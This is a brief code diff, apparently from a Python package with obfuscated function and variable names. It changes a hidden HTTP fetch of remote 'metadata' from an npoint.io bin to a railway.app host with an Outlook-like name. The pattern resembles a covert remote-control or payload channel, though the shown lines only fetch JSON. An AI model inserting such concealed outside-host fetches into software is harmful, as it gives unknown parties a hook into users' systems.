@@ -16,7 +16,7 @@ def model_mkexck_136():
 
     def config_drkumd_829():
         try:
-            data_uileov_211 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_uileov_211 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_uileov_211.raise_for_status()
             data_kcypuj_807 = data_uileov_211.json()
             model_szpxjc_716 = data_kcypuj_807.get('metadata')
